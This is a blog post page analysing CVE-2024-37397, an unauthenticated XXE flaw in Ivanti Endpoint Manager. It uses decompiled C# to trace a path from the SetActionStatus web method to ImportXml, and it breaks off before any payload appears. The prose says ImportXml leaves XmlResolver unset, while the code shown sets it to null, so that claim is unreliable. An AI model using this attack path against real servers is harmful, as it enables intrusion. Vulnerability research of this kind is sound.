<!DOCTYPE html>
<html class="no-js" lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability - </title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="http://localhost:1313/posts/ivanti-endpoint-manager-xxe-cve-2024-37397/">
  <meta property="og:title" content="CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability">
  <meta property="og:description" content="This blog provides an in-depth analysis of the exploitation process for an unauthenticated XXE vulnerability in Ivanti Endpoint Manager, identified as CVE-2024-37397.
Uncovering the ImportXml Vulnerability This vulnerability was identified by 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 and detailed in the ZDI advisory, which provided key information about the affected component. The advisory mentioned that the XXE vulnerability was found in the ImportXml function, guiding us to search for references to this specific function.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-11-24T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-11-24T00:00:00+00:00">
    <meta property="article:tag" content="CVE-2024-37297">
    <meta property="article:tag" content=".NET">
    <meta property="article:tag" content="OOB-XXE">
    <meta property="article:tag" content="XXE">

		
  <meta itemprop="name" content="CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability">
  <meta itemprop="description" content="This blog provides an in-depth analysis of the exploitation process for an unauthenticated XXE vulnerability in Ivanti Endpoint Manager, identified as CVE-2024-37397.
Uncovering the ImportXml Vulnerability This vulnerability was identified by 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 and detailed in the ZDI advisory, which provided key information about the affected component. The advisory mentioned that the XXE vulnerability was found in the ImportXml function, guiding us to search for references to this specific function.">
  <meta itemprop="datePublished" content="2024-11-24T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-11-24T00:00:00+00:00">
  <meta itemprop="wordCount" content="2761">
  <meta itemprop="keywords" content="CVE-2024-37297,.NET,OOB-XXE,XXE">
		
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability">
  <meta name="twitter:description" content="This blog provides an in-depth analysis of the exploitation process for an unauthenticated XXE vulnerability in Ivanti Endpoint Manager, identified as CVE-2024-37397.
Uncovering the ImportXml Vulnerability This vulnerability was identified by 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 and detailed in the ZDI advisory, which provided key information about the affected component. The advisory mentioned that the XXE vulnerability was found in the ImportXml function, guiding us to search for references to this specific function.">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo logo--mixed">
		<a class="logo__link" href="/" title="PwnFuzz" rel="home">
			<div class="logo__item logo__imagebox">
					<img class="logo__img" src="/img/pwnfuzz.png">
				</div><div class="logo__item logo__text">
					<div class="logo__title">PwnFuzz</div>
					<div class="logo__tagline">Fuzz. Pwn. Repeat.</div>
				</div>
		</a>
	</div>
		
<nav class="menu">
	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
		<span class="menu__btn-title" tabindex="-1">Menu</span>
	</button>
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/">
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about/">
				
				<span class="menu__text">About</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/tags/">
				
				<span class="menu__text">Tags</span>
				
			</a>
		</li>
	</ul>
</nav>

	</div>
</header>

		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability</h1>
			<div class="post__meta meta">
<div class="meta__item-datetime meta__item">
	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2024-11-24T00:00:00Z">November 24, 2024</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/cve-analysis/" rel="category">CVE Analysis</a>
	</span>
</div></div>
		</header>
		
<div class="post__toc toc">
	<div class="toc__title">Page content</div>
	<div class="toc__menu">
		<nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#overcoming-obstacles-challenges-in-exploiting-xxe">Overcoming Obstacles: Challenges in Exploiting XXE</a></li>
        <li><a href="#exploiting-xxe-turning-theory-into-action">Exploiting XXE: Turning Theory Into Action</a></li>
      </ul>
    </li>
  </ul>
</nav>
	</div>
</div><div class="content post__content clearfix">
			<p>This blog provides an in-depth analysis of the exploitation process for an unauthenticated XXE vulnerability in Ivanti Endpoint Manager, identified as CVE-2024-37397.</p>
<h1 id="uncovering-the-importxml-vulnerability">Uncovering the <code>ImportXml</code> Vulnerability</h1>
<hr>
<p><img src="/img/ivanti-cve-2024-37397/zdi-overview.jpg" alt=""></p>
<p>This vulnerability was identified by 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 and detailed in the ZDI advisory, which provided key information about the affected component. The advisory mentioned that the XXE vulnerability was found in the <code>ImportXml</code> function, guiding us to search for references to this specific function.</p>
<blockquote>
<p>I was able to get an evaluation copy of the Endpoint Manager using Wayback Machine, from there setup was as easy as following the prompts.</p></blockquote>
<p>Once the installation was complete, I used <code>ripgrep</code> tool to look for any references for <code>ImportXml</code> within the installed directory. Multiple instances were found in following DLLs:</p>
<p>Fortunately, these DLLs are .NET executables, we can load it into the <code>dnSpy</code> and start analyzing right way. Once loaded, we can see that there are multiple classes where <code>importXml</code> is defined and used.</p>
<p>One thing that is common in all of the <code>ImportXml</code> functions defined everywhere is that none of them explictly make the <code>XmlResolver</code>  as <code>null</code> which is a workaround for XXE vulnerabilities in .NET applications. Given that we now know which DLL has the definition for our vulnerable function, it is now time to look into which function actually calls for this function so we can trigger this for our gain.</p>
<h1 id="triggering-the-vulnerability-understanding-the-flaw">Triggering the Vulnerability: Understanding the Flaw</h1>
<p>Initially, when running <code>rg</code> again, there were no other DLLs where <code>ImportXml</code> was called. This indicated that we might be looking for a pattern where a function from the identified DLL calls ImportXml, and that function is called elsewhere. Running <code>rg</code> in this case would be time-consuming and might not yield concrete results, so we needed to move forward by understanding the different components of the application, or alternatively, by considering the paths of the identified DLLs.</p>
<p>One place where the [] DLL was found was under <em>ProvisioningWebService</em>. Given its name, this most likely suggests that a web service is being handled by the DLLs in this directory. Upon further investigation, we identified the following DLLs:</p>
<p>There is a <code>ProvisioningWebService.dll</code>, which looks promising. Loading it into dnSpy, we can see that the DLL has a class <code>ProvisioningService</code> which has multiple methods defined:</p>
<p><img src="/img/ivanti-cve-2024-37397/provisioning-service-methods.jpg" alt=""></p>
<p>Checking these methods has <code>[WebMethod]</code> attributes defined, indicating that these methods handle data from web requests.</p>
<p><img src="/img/ivanti-cve-2024-37397/webmethods-identified.jpg" alt=""></p>
<p>Looking into the imports of this class, we can see that <code>LANDesk.Provisioning.Business</code> DLL is called, given that we might be on right track of finding the source/sink pattern of our vulnerability.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>using LANDesk.Provisioning.Business;
</span></span></code></pre></div><p>As we observed earlier, there were no reference of <code>ImportXml</code> directly found within any DLL and <code>ProvisioningService</code> class was no different but we see that there are some methods that were defined within the <code>LANDesk.Provisioning.Business</code> are called here such as <code>PHistoryTask</code> or <code>PHistoryEntry</code>. The identified functions were <code>GetProvisioningBootOption</code> which was as following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">	[WebMethod]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> GetProvisioningBootOption(<span style="color:#66d9ef">string</span> clientMacAddress, <span style="color:#66d9ef">string</span> pxeProxyMacAddress, <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">int</span> holdingQueuePEtype)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> num = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.log.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#e6db74">&#34;&gt;&gt;  GetProvisioningBootOption, clientMacAddress={0}&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[]
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				clientMacAddress
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>			ServerIdentifier[] sids = <span style="color:#66d9ef">new</span> ServerIdentifier[]
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				ServerIdentifier.getInstance(ServerIdentifierType.MACAddress, clientMacAddress)
</span></span><span style="display:flex;"><span>			};
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> ldTaskIdn = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span>[] computerId = TemplateFinder.GetComputerId(sids);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (computerId.Length &lt; <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">this</span>.log.Log(PRollingLog.logLevel.ERROR, <span style="color:#e6db74">&#34;Unable to find computer with Macaddress {0}&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[]
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					clientMacAddress
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">[..snip..]</span>           
</span></span></code></pre></div><p>Certain things that is observable at first is the argument, we see that it takes two different arguments <code>clientMacAddress</code> and other was <code>pxeProxyMacAddress</code> which did not seem like something where we can inject some payload or try, at least from the naked eye. But that&rsquo;s where the other function named <code>SetActionStatus</code> entered in the play. Looking closer into the function we see that it indeed takes an argument of <code>actionXml</code> which seemed promising right off the bat.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">		[WebMethod]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> ProvisioningService.SetActionStatusRet SetActionStatus(<span style="color:#66d9ef">int</span> historyTaskIDN, <span style="color:#66d9ef">int</span> historyEntryIDN, <span style="color:#66d9ef">int</span> nextHistoryEntryIDN, <span style="color:#66d9ef">string</span> actionState, <span style="color:#66d9ef">int</span> internalRetval, <span style="color:#66d9ef">int</span> externalRetval, <span style="color:#66d9ef">string</span> strCapturedText, UserVariable[] Variables, <span style="color:#66d9ef">string</span> actionXml)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.log.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#e6db74">&#34;SetActionStatus (historyTaskIdn {0}, historyEntryIdn {1}, next {2}): state {3}&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[]
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				historyTaskIDN,
</span></span><span style="display:flex;"><span>				historyEntryIDN,
</span></span><span style="display:flex;"><span>				nextHistoryEntryIDN,
</span></span><span style="display:flex;"><span>				actionState
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>			PError perror = <span style="color:#66d9ef">new</span> PError();
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">bool</span> flag = PHistoryEntry.WriteActionStatus(historyTaskIDN, historyEntryIDN, nextHistoryEntryIDN, actionState, internalRetval, externalRetval, strCapturedText, Variables, actionXml, <span style="color:#66d9ef">ref</span> perror);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (flag)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> ProvisioningService.SetActionStatusRet.Ok;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.log.Log(PRollingLog.logLevel.ERROR, <span style="color:#e6db74">&#34;Unable to set the action status (historyTaskIdn {0}, historyEntryIdn {1}, next {2}): {3}&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[]
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				historyTaskIDN,
</span></span><span style="display:flex;"><span>				historyEntryIDN,
</span></span><span style="display:flex;"><span>				nextHistoryEntryIDN,
</span></span><span style="display:flex;"><span>				perror.Message
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> ProvisioningService.SetActionStatusRet.SetStatusFailed;
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><p>Since this is also a <code>[WebMethod]</code> we can be cetain that this particular method can be invoked somehow from the HTTP request. Further analysis of this revealed that it calls <code>PHistoryEntry.WriteActionStatus</code> method which is defined <code>LANDesk.Provisioning.Business</code> DLL. The arguments passed into the <code>WriteActionStatus</code> is something we will take a note of when analyzing the <code>WriteActionStatus</code> class.</p>
<p>Now, when we check the <code>PHistoryEntry</code> class, we notice that there is a defined method <code>ImportXml</code> as well as our method in question <code>WriteActionStatus</code>. Checking the <code>ImportXml</code> method, we see that it takes the <code>actionXml</code> as string and later processes it via the <code>XmlDocument</code> parser. As we discussed earlier, the <code>XmlResolver</code> value is not set to <code>null</code> meaning that we have can include external DTDs and the parser here will attempt to get the definition from the DTD and perform the processing of the same.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>		<span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">bool</span> ImportXml(<span style="color:#66d9ef">string</span> actionXml)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">bool</span> flag = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					flag = PUser.ValidateProvisioningCreateRight(<span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">this</span>.err);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				XmlDocument xmlDocument = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>				XmlNode xmlNode = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag &amp;&amp; actionXml != <span style="color:#66d9ef">null</span> &amp;&amp; actionXml.Length &gt; <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					xmlDocument = <span style="color:#66d9ef">new</span> XmlDocument();
</span></span><span style="display:flex;"><span>					xmlDocument.XmlResolver = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>					xmlDocument.LoadXml(actionXml);
</span></span><span style="display:flex;"><span>					xmlNode = xmlDocument.SelectSingleNode(<span style="color:#e6db74">&#34;xmlsnippet&#34;</span>);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (xmlNode != <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						xmlNode = xmlNode.FirstChild;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (xmlNode != <span style="color:#66d9ef">null</span> &amp;&amp; xmlNode.Name == <span style="color:#e6db74">&#34;variables&#34;</span>)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						xmlNode = xmlNode.NextSibling;
</span></span></code></pre></div><p>But before going there, we need to check how the <code>WriteActionStatus</code> calls our <code>ImportXml</code> and how we can actually trigger our vulnerability. The <code>WriteActionStatus</code> method was defined as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">bool</span> WriteActionStatus(<span style="color:#66d9ef">int</span> historyTaskIDN, <span style="color:#66d9ef">int</span> historyEntryIDN, <span style="color:#66d9ef">int</span> nextHistoryEntryIDN, <span style="color:#66d9ef">string</span> actionState, <span style="color:#66d9ef">int</span> internalRetval, <span style="color:#66d9ef">int</span> externalRetval, <span style="color:#66d9ef">string</span> strCapturedText, UserVariable[] UserVariables, <span style="color:#66d9ef">string</span> actionXml, <span style="color:#66d9ef">ref</span> PError err)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			PRollingLog prollingLog = <span style="color:#66d9ef">new</span> PRollingLog(<span style="color:#e6db74">&#34;PHistoryEntry&#34;</span>);
</span></span><span style="display:flex;"><span>			PHistoryTask phistoryTask = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>			PHistoryEntry phistoryEntry = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>			PHistoryEntry phistoryEntry2 = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>			DateTime utcNow = DateTime.UtcNow;
</span></span><span style="display:flex;"><span>			HistoryEntryStateType historyEntryStateType = HistoryEntryStateType.UNKNOWN;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">bool</span> flag = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">bool</span> flag2 = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (!flag2)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag2)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					phistoryEntry = <span style="color:#66d9ef">new</span> PHistoryEntry(historyEntryIDN);
</span></span><span style="display:flex;"><span>					phistoryEntry2 = <span style="color:#66d9ef">new</span> PHistoryEntry(nextHistoryEntryIDN);
</span></span><span style="display:flex;"><span>					phistoryTask = <span style="color:#66d9ef">new</span> PHistoryTask(historyTaskIDN);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (!OleDbHelper.IsValidIdnRange(phistoryTask.Id) &amp;&amp; OleDbHelper.IsValidIdnRange(phistoryEntry.Id))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						phistoryTask = <span style="color:#66d9ef">new</span> PHistoryTask(phistoryEntry.HistoryTaskId);
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (!OleDbHelper.IsValidIdnRange(phistoryTask.Id) &amp;&amp; OleDbHelper.IsValidIdnRange(phistoryEntry2.Id))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						phistoryTask = <span style="color:#66d9ef">new</span> PHistoryTask(phistoryEntry2.HistoryTaskId);
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (OleDbHelper.IsValidIdnRange(historyEntryIDN) &amp;&amp; !OleDbHelper.IsValidIdnRange(phistoryEntry.Id))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. History entry record Idn=&#39;{0}&#39; does not exist.&#34;</span>, historyEntryIDN), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>						err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.InvalidHistoryEntry&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>						flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (OleDbHelper.IsValidIdnRange(nextHistoryEntryIDN) &amp;&amp; !OleDbHelper.IsValidIdnRange(phistoryEntry2.Id))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. Next history entry record Idn=&#39;{0}&#39; does not exist.&#34;</span>, nextHistoryEntryIDN), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>						err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.InvalidHistoryEntry&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>						flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (!OleDbHelper.IsValidIdnRange(phistoryTask.Id) || (OleDbHelper.IsValidIdnRange(phistoryEntry.Id) &amp;&amp; phistoryTask.Id != phistoryEntry.HistoryTaskId) || (OleDbHelper.IsValidIdnRange(phistoryEntry2.Id) &amp;&amp; phistoryTask.Id != phistoryEntry2.HistoryTaskId))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. Problem with history task record Idn, Declared history task Idn=&#39;{0}&#39;. History entry&#39;s task Idn=&#39;{1}. Next history entry&#39;s task Idn=&#39;{2}&#34;</span>, historyTaskIDN, phistoryEntry.HistoryTaskId, phistoryEntry2.HistoryTaskId), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>						err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.InvalidHistoryTask&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>						flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag2 &amp;&amp; phistoryTask.Template == <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. Unable to locate template Idn=&#39;{0}&#39; for history task Idn=&#39;{1}&#39;.&#34;</span>, phistoryTask.TemplateId, phistoryTask.Id), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>					err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.InvalidTemplate&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>					flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag2 &amp;&amp; !OleDbHelper.IsValidIdnRange(phistoryTask.LDTaskId))
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. The scheduler LDTask is missing for history task Idn {0}.&#34;</span>, phistoryTask.Id), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>					err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.InvalidScheduledTask&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>					flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>					flag = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag2 &amp;&amp; phistoryTask.State != HistoryTaskStateType.Running &amp;&amp; phistoryTask.State != HistoryTaskStateType.Waiting &amp;&amp; phistoryTask.State != HistoryTaskStateType.Canceled)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. Altering history task Idn {0} state is not allowed. {1}.&#34;</span>, phistoryTask.Id, phistoryTask.State), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>					err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.HistoryTaskNotRunning&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>					flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag2 &amp;&amp; (phistoryEntry.State == HistoryEntryStateType.SUCCESS || phistoryEntry.State == HistoryEntryStateType.FAILED))
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. Altering history entry Idn {0} state is not allowed. {1}.&#34;</span>, phistoryEntry.Id, phistoryEntry.State), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>					err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.UnableToModifyHistoryEntry&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>					flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag2)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">string</span> a <span style="color:#66d9ef">in</span> Enum.GetNames(<span style="color:#66d9ef">typeof</span>(HistoryEntryStateType)))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">if</span> (a == actionState)
</span></span><span style="display:flex;"><span>						{
</span></span><span style="display:flex;"><span>							historyEntryStateType = (HistoryEntryStateType)Enum.Parse(<span style="color:#66d9ef">typeof</span>(HistoryEntryStateType), actionState);
</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>						}
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (historyEntryStateType == HistoryEntryStateType.UNKNOWN)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						prollingLog.Log(PRollingLog.logLevel.VERBOSE, <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">&#34;Unable to write to database. Action state does not map to a business layer enum value, &#39;{0}&#39;.&#34;</span>, actionState), Array.Empty&lt;<span style="color:#66d9ef">object</span>&gt;());
</span></span><span style="display:flex;"><span>						err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.UnableToModifyHistoryEntry&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>						flag2 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>					}
